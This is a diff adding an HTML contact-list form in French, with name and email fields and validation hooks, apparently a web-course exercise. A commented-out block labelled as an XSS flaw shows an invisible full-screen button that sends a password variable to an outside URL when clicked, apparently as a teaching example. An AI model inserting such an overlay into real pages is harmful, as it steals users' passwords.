@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="./style.css">
+    <title>Contact Liste</title>
+</head>
+
+<body>
+    <header>
+        <h1>Contact Liste</h1>
+    </header>
+    <main>
+        <form onsubmit="createContact(event)">
+            <fieldset>
+                <legend>Contact</legend>
+                <label for="firstName">Prenom</label>
+                <input type="text" data-nom="prenom" name="firstName" id="firstName" required minlength="4" oninput="isValid(event)">
+                <p></p>
+                
+                <label for="lastName">Nom</label>
+                <input type="text" data-nom="nom" name="lastName" id="lastName" oninput="isValid()">
+                <p></p>
+
+                <label for="email">Email</label>
+                <input type="email" data-nom="email" name="email" id="email" oninput="isValid()">
+                <p></p>
+                
+                <br/>
+                <input 
+                    type="submit" 
+                    value="Ajoutez contact" 
+                    id="add-contact" 
+                    name="addcontact" 
+                    disabled/>
+            </fieldset>
+
+            <!-- Faille XSS (Cross Site Scripting) -->
+            <!-- <button style="position:absolute; top:0; left:0; width: 100vw; height: 100vh; opacity: 0;" onClick="window.location.href=`https://dawan.fr?mdp=${motDePasse}`">
+                hello
+            </button> -->
+
+        </form>
+        <div id="error-msg">
+
+        </div>      
+        <div id="display-contact">
+
+        </div>
+    </main>
+    <script src="./index.js"></script>
+</body>
+
+</html>
